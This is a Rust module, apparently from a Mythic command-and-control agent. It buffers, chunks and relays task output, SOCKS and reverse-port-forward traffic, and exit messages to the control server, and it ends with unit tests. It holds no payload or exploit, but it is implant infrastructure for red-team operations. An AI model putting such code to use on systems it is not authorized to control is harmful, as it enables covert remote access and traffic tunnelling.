use crate::structs::{
    Alert, DelegateMessage, InteractiveTaskMessage, MythicMessage, P2PConnectionMessage, Response,
    SocksMsg,
};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Mutex;
use std::time::Instant;
use tokio::sync::mpsc;

pub const USER_OUTPUT_CHUNK_SIZE: usize = 512_000;

/// Flag set when the agent is exiting. Causes the next drain_poll_buffer call
/// to produce a message with action="exit" so Mythic marks the callback dead.
static EXIT_REQUESTED: AtomicBool = AtomicBool::new(false);

lazy_static::lazy_static! {
    /// Timestamp of last real message from Mythic (for backoff logic)
    pub static ref LAST_MESSAGE_TIME: Mutex<Instant> = Mutex::new(Instant::now());
    /// Global buffer for poll-based profiles (HTTP). Responses accumulate here
    /// between poll cycles and get drained into each outgoing get_tasking POST.
    static ref POLL_BUFFER: Mutex<ResponseBuffer> = Mutex::new(ResponseBuffer::new());
}

pub fn update_last_message_time() {
    if let Ok(mut t) = LAST_MESSAGE_TIME.lock() {
        *t = Instant::now();
    }
}

pub fn get_last_message_time() -> Instant {
    LAST_MESSAGE_TIME.lock().map(|t| *t).unwrap_or_else(|_| Instant::now())
}

/// Calculate chunk count for a given data size
pub fn get_chunk_nums(size: usize) -> usize {
    std::cmp::max(1, (size + USER_OUTPUT_CHUNK_SIZE - 1) / USER_OUTPUT_CHUNK_SIZE)
}

/// All channels used by the response aggregation system
pub struct ResponseChannels {
    // Outbound channels (tasks send TO these)
    pub new_response_tx: mpsc::Sender<Response>,
    pub new_delegate_to_mythic_tx: mpsc::Sender<DelegateMessage>,
    pub p2p_connection_message_tx: mpsc::Sender<P2PConnectionMessage>,
    pub new_interactive_task_output_tx: mpsc::Sender<InteractiveTaskMessage>,
    pub new_alert_tx: mpsc::Sender<Alert>,
    pub to_mythic_socks_tx: mpsc::Sender<SocksMsg>,
    pub to_mythic_rpfwd_tx: mpsc::Sender<SocksMsg>,

    // Inbound channels (from Mythic, routed to tasks)
    pub from_mythic_socks_tx: mpsc::Sender<SocksMsg>,
    pub from_mythic_rpfwd_tx: mpsc::Sender<SocksMsg>,

    // Inbound channel for messages from egress/P2P
    pub handle_inbound_mythic_message_tx: mpsc::Sender<crate::structs::MythicMessageResponse>,

    // Receivers for SOCKS/RPFWD (consumed by proxy handlers)
    pub from_mythic_socks_rx: mpsc::Receiver<SocksMsg>,
    pub from_mythic_rpfwd_rx: mpsc::Receiver<SocksMsg>,
}

/// Buffered responses waiting to be sent to Mythic
pub struct ResponseBuffer {
    responses: Vec<Response>,
    delegates: Vec<DelegateMessage>,
    edges: Vec<P2PConnectionMessage>,
    interactive_tasks: Vec<InteractiveTaskMessage>,
    alerts: Vec<Alert>,
    socks: Vec<SocksMsg>,
    rpfwds: Vec<SocksMsg>,
}

impl ResponseBuffer {
    fn new() -> Self {
        Self {
            responses: Vec::new(),
            delegates: Vec::new(),
            edges: Vec::new(),
            interactive_tasks: Vec::new(),
            alerts: Vec::new(),
            socks: Vec::new(),
            rpfwds: Vec::new(),
        }
    }

    fn is_empty(&self) -> bool {
        self.responses.is_empty()
            && self.delegates.is_empty()
            && self.edges.is_empty()
            && self.interactive_tasks.is_empty()
            && self.alerts.is_empty()
            && self.socks.is_empty()
            && self.rpfwds.is_empty()
    }
}

/// Initialize the response aggregation system
pub fn initialize(
    get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
) -> ResponseChannels {
    let (response_tx, response_rx) = mpsc::channel::<Response>(100);
    let (delegate_tx, delegate_rx) = mpsc::channel::<DelegateMessage>(100);
    let (p2p_msg_tx, p2p_msg_rx) = mpsc::channel::<P2PConnectionMessage>(100);
    let (interactive_tx, interactive_rx) = mpsc::channel::<InteractiveTaskMessage>(100);
    let (alert_tx, alert_rx) = mpsc::channel::<Alert>(100);
    let (socks_out_tx, socks_out_rx) = mpsc::channel::<SocksMsg>(10000);
    let (rpfwd_out_tx, rpfwd_out_rx) = mpsc::channel::<SocksMsg>(10000);
    let (socks_in_tx, socks_in_rx) = mpsc::channel::<SocksMsg>(10000);
    let (rpfwd_in_tx, rpfwd_in_rx) = mpsc::channel::<SocksMsg>(10000);
    let (inbound_tx, _inbound_rx) =
        mpsc::channel::<crate::structs::MythicMessageResponse>(10);

    // Spawn aggregator listeners
    tokio::spawn(listen_for_delegate_messages_to_mythic(
        delegate_rx,
        get_push_channel,
    ));
    tokio::spawn(listen_for_edge_announcements_to_mythic(
        p2p_msg_rx,
        get_push_channel,
    ));
    tokio::spawn(listen_for_interactive_tasks_to_mythic(
        interactive_rx,
        get_push_channel,
    ));
    tokio::spawn(listen_for_alert_messages_to_mythic(
        alert_rx,
        get_push_channel,
    ));
    tokio::spawn(listen_for_task_responses_to_mythic(
        response_rx,
        get_push_channel,
    ));
    tokio::spawn(listen_for_socks_traffic_to_mythic(
        socks_out_rx,
        get_push_channel,
    ));
    tokio::spawn(listen_for_rpfwd_traffic_to_mythic(
        rpfwd_out_rx,
        get_push_channel,
    ));

    ResponseChannels {
        new_response_tx: response_tx,
        new_delegate_to_mythic_tx: delegate_tx,
        p2p_connection_message_tx: p2p_msg_tx,
        new_interactive_task_output_tx: interactive_tx,
        new_alert_tx: alert_tx,
        to_mythic_socks_tx: socks_out_tx,
        to_mythic_rpfwd_tx: rpfwd_out_tx,
        from_mythic_socks_tx: socks_in_tx,
        from_mythic_rpfwd_tx: rpfwd_in_tx,
        handle_inbound_mythic_message_tx: inbound_tx,
        from_mythic_socks_rx: socks_in_rx,
        from_mythic_rpfwd_rx: rpfwd_in_rx,
    }
}

/// Drain the global poll buffer and return a MythicMessage with all pending data.
/// Called by poll-based profiles (HTTP) each iteration of their polling loop.
/// If an exit has been requested, the returned message will have action="exit".
pub fn drain_poll_buffer() -> MythicMessage {
    let mut buf = POLL_BUFFER.lock().unwrap();
    let mut msg = create_mythic_poll_message(&mut buf);
    if EXIT_REQUESTED.load(Ordering::Relaxed) {
        msg.action = "exit".to_string();
    }
    msg
}

/// Re-buffer a MythicMessage that failed to send, so its contents aren't lost.
/// SOCKS and RPFWD data is intentionally dropped — it's ephemeral stream data
/// and re-buffering it can create an infinite loop of oversized messages.
pub fn buffer_failed_message(mut msg: MythicMessage) {
    let socks_count = msg.socks.as_ref().map_or(0, |s| s.len());
    let rpfwd_count = msg.rpfwds.as_ref().map_or(0, |r| r.len());
    if socks_count > 0 || rpfwd_count > 0 {
        crate::utils::print_debug(&format!(
            "Dropping {} socks + {} rpfwd messages on send failure (ephemeral)",
            socks_count, rpfwd_count
        ));
    }
    msg.socks = None;
    msg.rpfwds = None;
    buffer_message(msg);
}

/// Store a MythicMessage's contents into the global poll buffer.
/// Used by response listeners when no push channel is available.
fn buffer_message(msg: MythicMessage) {
    let mut buf = POLL_BUFFER.lock().unwrap();
    if let Some(responses) = msg.responses {
        buf.responses.extend(responses);
    }
    if let Some(delegates) = msg.delegates {
        buf.delegates.extend(delegates);
    }
    if let Some(edges) = msg.edges {
        buf.edges.extend(edges);
    }
    if let Some(interactive) = msg.interactive_tasks {
        buf.interactive_tasks.extend(interactive);
    }
    if let Some(alerts) = msg.alerts {
        buf.alerts.extend(alerts);
    }
    if let Some(socks) = msg.socks {
        buf.socks.extend(socks);
    }
    if let Some(rpfwds) = msg.rpfwds {
        buf.rpfwds.extend(rpfwds);
    }
}

/// Maximum number of SOCKS/RPFWD messages to include per poll cycle.
/// Each message is ~21KB (16KB data + base64 overhead). Capped at 40 so that
/// SOCKS + RPFWD together stay well under CloudFront/proxy payload limits (~1MB):
///   40 × 21KB = 840KB per direction, leaving headroom for task responses.
const MAX_SOCKS_PER_POLL: usize = 40;

/// Create a MythicMessage for polling, draining all buffered data
fn create_mythic_poll_message(buffer: &mut ResponseBuffer) -> MythicMessage {
    let mut msg = MythicMessage::new_get_tasking();

    if !buffer.responses.is_empty() {
        // Handle chunking for large responses
        let mut chunked_responses = Vec::new();
        for response in buffer.responses.drain(..) {
            if response.user_output.len() > USER_OUTPUT_CHUNK_SIZE {
                // Split into chunks
                let chunks = get_chunk_nums(response.user_output.len());
                let bytes = response.user_output.as_bytes();
                for i in 0..chunks {
                    let start = i * USER_OUTPUT_CHUNK_SIZE;
                    let end = std::cmp::min((i + 1) * USER_OUTPUT_CHUNK_SIZE, bytes.len());
                    let chunk = String::from_utf8_lossy(&bytes[start..end]).to_string();
                    let mut chunk_response = response.clone();
                    chunk_response.user_output = chunk;
                    // Only mark completed on last chunk
                    if i < chunks - 1 {
                        chunk_response.completed = false;
                    }
                    chunked_responses.push(chunk_response);
                }
            } else {
                chunked_responses.push(response);
            }
        }
        msg.responses = Some(chunked_responses);
    }

    if !buffer.delegates.is_empty() {
        msg.delegates = Some(buffer.delegates.drain(..).collect());
    }

    if !buffer.edges.is_empty() {
        msg.edges = Some(buffer.edges.drain(..).collect());
    }

    if !buffer.interactive_tasks.is_empty() {
        msg.interactive_tasks = Some(buffer.interactive_tasks.drain(..).collect());
    }

    if !buffer.alerts.is_empty() {
        msg.alerts = Some(buffer.alerts.drain(..).collect());
    }

    if !buffer.socks.is_empty() {
        let count = std::cmp::min(buffer.socks.len(), MAX_SOCKS_PER_POLL);
        let drained: Vec<_> = buffer.socks.drain(..count).collect();
        msg.socks = Some(drained);
    }

    if !buffer.rpfwds.is_empty() {
        let count = std::cmp::min(buffer.rpfwds.len(), MAX_SOCKS_PER_POLL);
        let drained: Vec<_> = buffer.rpfwds.drain(..count).collect();
        msg.rpfwds = Some(drained);
    }

    msg
}

// ============================================================================
// Response Aggregator Listeners
// ============================================================================

async fn try_push_or_buffer(
    msg: MythicMessage,
    get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
) {
    if let Some(push_tx) = get_push_channel() {
        let _ = push_tx.send(msg).await;
    } else {
        // Poll-based profile (HTTP): buffer for next poll cycle
        buffer_message(msg);
    }
}

async fn listen_for_delegate_messages_to_mythic(
    mut rx: mpsc::Receiver<DelegateMessage>,
    get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
) {
    while let Some(delegate) = rx.recv().await {
        let mut msg = MythicMessage::new_get_tasking();
        msg.delegates = Some(vec![delegate]);
        try_push_or_buffer(msg, get_push_channel).await;
    }
}

async fn listen_for_edge_announcements_to_mythic(
    mut rx: mpsc::Receiver<P2PConnectionMessage>,
    get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
) {
    while let Some(edge) = rx.recv().await {
        let mut msg = MythicMessage::new_get_tasking();
        msg.edges = Some(vec![edge]);
        try_push_or_buffer(msg, get_push_channel).await;
    }
}

async fn listen_for_interactive_tasks_to_mythic(
    mut rx: mpsc::Receiver<InteractiveTaskMessage>,
    get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
) {
    while let Some(interactive) = rx.recv().await {
        let mut msg = MythicMessage::new_get_tasking();
        msg.interactive_tasks = Some(vec![interactive]);
        try_push_or_buffer(msg, get_push_channel).await;
    }
}

async fn listen_for_alert_messages_to_mythic(
    mut rx: mpsc::Receiver<Alert>,
    get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
) {
    while let Some(alert) = rx.recv().await {
        let mut msg = MythicMessage::new_get_tasking();
        msg.alerts = Some(vec![alert]);
        try_push_or_buffer(msg, get_push_channel).await;
    }
}

async fn listen_for_task_responses_to_mythic(
    mut rx: mpsc::Receiver<Response>,
    get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
) {
    while let Some(response) = rx.recv().await {
        // Handle chunking for large responses
        if response.user_output.len() > USER_OUTPUT_CHUNK_SIZE {
            let chunks = get_chunk_nums(response.user_output.len());
            let bytes = response.user_output.as_bytes();
            for i in 0..chunks {
                let start = i * USER_OUTPUT_CHUNK_SIZE;
                let end = std::cmp::min((i + 1) * USER_OUTPUT_CHUNK_SIZE, bytes.len());
                let chunk = String::from_utf8_lossy(&bytes[start..end]).to_string();
                let mut chunk_response = response.clone();
                chunk_response.user_output = chunk;
                if i < chunks - 1 {
                    chunk_response.completed = false;
                }
                let mut msg = MythicMessage::new_get_tasking();
                msg.responses = Some(vec![chunk_response]);
                try_push_or_buffer(msg, get_push_channel).await;
            }
        } else {
            let mut msg = MythicMessage::new_get_tasking();
            msg.responses = Some(vec![response]);
            try_push_or_buffer(msg, get_push_channel).await;
        }
    }
}

async fn listen_for_socks_traffic_to_mythic(
    mut rx: mpsc::Receiver<SocksMsg>,
    get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
) {
    while let Some(socks) = rx.recv().await {
        if let Some(push_tx) = get_push_channel() {
            // Push-based: send directly with timeout, drop if full
            let mut msg = MythicMessage::new_get_tasking();
            msg.socks = Some(vec![socks]);
            if tokio::time::timeout(
                std::time::Duration::from_secs(1),
                push_tx.send(msg),
            )
            .await
            .is_err()
            {
                crate::utils::print_debug("Dropping socks push data (channel full/timeout)");
            }
        } else {
            // Poll-based: buffer with back-pressure (drop if buffer too large)
            let mut buf = POLL_BUFFER.lock().unwrap();
            if buf.socks.len() < 2000 {
                buf.socks.push(socks);
            } else {
                crate::utils::print_debug("Dropping socks data (buffer full)");
            }
        }
    }
}

async fn listen_for_rpfwd_traffic_to_mythic(
    mut rx: mpsc::Receiver<SocksMsg>,
    get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
) {
    while let Some(rpfwd) = rx.recv().await {
        if let Some(push_tx) = get_push_channel() {
            // Push-based: send directly with timeout, drop if full
            let mut msg = MythicMessage::new_get_tasking();
            msg.rpfwds = Some(vec![rpfwd]);
            if tokio::time::timeout(
                std::time::Duration::from_secs(1),
                push_tx.send(msg),
            )
            .await
            .is_err()
            {
                crate::utils::print_debug("Dropping rpfwd push data (channel full/timeout)");
            }
        } else {
            // Poll-based: buffer with back-pressure (drop if buffer too large)
            let mut buf = POLL_BUFFER.lock().unwrap();
            if buf.rpfwds.len() < 2000 {
                buf.rpfwds.push(rpfwd);
            } else {
                crate::utils::print_debug("Dropping rpfwd data (buffer full)");
            }
        }
    }
}

/// Send an exit message to Mythic to immediately mark the callback as dead.
/// For push-based profiles (WebSocket), sends immediately.
/// For poll-based profiles (HTTP), sets a flag so the next poll uses action="exit".
pub async fn send_exit_message(get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>) {
    // Try to send via push channel if available
    if let Some(tx) = get_push_channel() {
        let exit_msg = MythicMessage::new_exit();
        let _ = tx.send(exit_msg).await;
        crate::utils::print_debug("Exit message sent via push channel");
    } else {
        // Poll-based profile: set flag so next drain_poll_buffer produces action="exit"
        EXIT_REQUESTED.store(true, Ordering::Relaxed);
        crate::utils::print_debug("Exit flag set for next poll cycle");
    }
}

// =============================================================================
// Tests
// =============================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use crate::structs::{Response, SocksMsg};
    use serial_test::serial;

    // -------------------------------------------------------------------------
    // get_chunk_nums — pure function, no global state
    // -------------------------------------------------------------------------

    #[test]
    fn test_chunk_nums_zero_bytes_is_one_chunk() {
        assert_eq!(get_chunk_nums(0), 1);
    }

    #[test]
    fn test_chunk_nums_one_byte_is_one_chunk() {
        assert_eq!(get_chunk_nums(1), 1);
    }

    #[test]
    fn test_chunk_nums_exact_boundary_is_one_chunk() {
        assert_eq!(get_chunk_nums(USER_OUTPUT_CHUNK_SIZE), 1);
    }

    #[test]
    fn test_chunk_nums_one_over_boundary_is_two_chunks() {
        assert_eq!(get_chunk_nums(USER_OUTPUT_CHUNK_SIZE + 1), 2);
    }

    #[test]
    fn test_chunk_nums_double_boundary_is_two_chunks() {
        assert_eq!(get_chunk_nums(USER_OUTPUT_CHUNK_SIZE * 2), 2);
    }

    #[test]
    fn test_chunk_nums_double_plus_one_is_three_chunks() {
        assert_eq!(get_chunk_nums(USER_OUTPUT_CHUNK_SIZE * 2 + 1), 3);
    }

    // -------------------------------------------------------------------------
    // buffer_failed_message — touches global POLL_BUFFER; run serially
    // -------------------------------------------------------------------------

    /// Drain any leftover state so each serial test starts clean.
    fn clean_buffer() {
        let _ = drain_poll_buffer();
        EXIT_REQUESTED.store(false, Ordering::Relaxed);
    }

    #[test]
    #[serial]
    fn test_buffer_failed_message_drops_socks_and_rpfwd() {
        clean_buffer();

        let mut msg = MythicMessage::new_get_tasking();
        msg.socks = Some(vec![SocksMsg {
            server_id: 1,
            data: "AAAA".to_string(),
            exit: false,
            port: 0,
        }]);
        msg.rpfwds = Some(vec![SocksMsg {
            server_id: 2,
            data: "BBBB".to_string(),
            exit: false,
            port: 0,
        }]);
        msg.responses = Some(vec![Response {
            task_id: "t1".to_string(),
            user_output: "kept".to_string(),
            completed: true,
            ..Default::default()
        }]);

        buffer_failed_message(msg);
        let drained = drain_poll_buffer();

        // Socks and rpfwd must be stripped
        assert!(drained.socks.is_none() || drained.socks.as_ref().unwrap().is_empty());
        assert!(drained.rpfwds.is_none() || drained.rpfwds.as_ref().unwrap().is_empty());

        // Task response must be preserved
        let responses = drained.responses.expect("responses must be present");
        assert_eq!(responses.len(), 1);
        assert_eq!(responses[0].user_output, "kept");

        clean_buffer();
    }

    #[test]
    #[serial]
    fn test_drain_poll_buffer_action_is_get_tasking() {
        clean_buffer();
        let msg = drain_poll_buffer();
        assert_eq!(msg.action, "get_tasking");
    }

    #[test]
    #[serial]
    fn test_drain_poll_buffer_clears_responses() {
        clean_buffer();

        // Buffer a response via buffer_failed_message (simplest path to POLL_BUFFER)
        let mut msg = MythicMessage::new_get_tasking();
        msg.responses = Some(vec![Response {
            task_id: "t2".to_string(),
            user_output: "output".to_string(),
            completed: true,
            ..Default::default()
        }]);
        buffer_failed_message(msg);

        // First drain should return the response
        let first = drain_poll_buffer();
        assert!(first.responses.is_some());

        // Second drain should be empty — buffer was consumed
        let second = drain_poll_buffer();
        assert!(second.responses.is_none() || second.responses.unwrap().is_empty());

        clean_buffer();
    }

    #[test]
    #[serial]
    fn test_large_response_is_chunked() {
        clean_buffer();

        // Build a response just over the chunk boundary
        let big_output = "X".repeat(USER_OUTPUT_CHUNK_SIZE + 1);
        let mut msg = MythicMessage::new_get_tasking();
        msg.responses = Some(vec![Response {
            task_id: "t3".to_string(),
            user_output: big_output,
            completed: true,
            ..Default::default()
        }]);
        buffer_failed_message(msg);

        let drained = drain_poll_buffer();
        let responses = drained.responses.expect("responses required");
        // Must be split into at least 2 chunks
        assert!(responses.len() >= 2, "expected chunking, got {} chunks", responses.len());
        // Only the last chunk should be marked completed
        for r in &responses[..responses.len() - 1] {
            assert!(!r.completed, "intermediate chunks must not be completed");
        }
        assert!(responses.last().unwrap().completed);

        clean_buffer();
    }
}
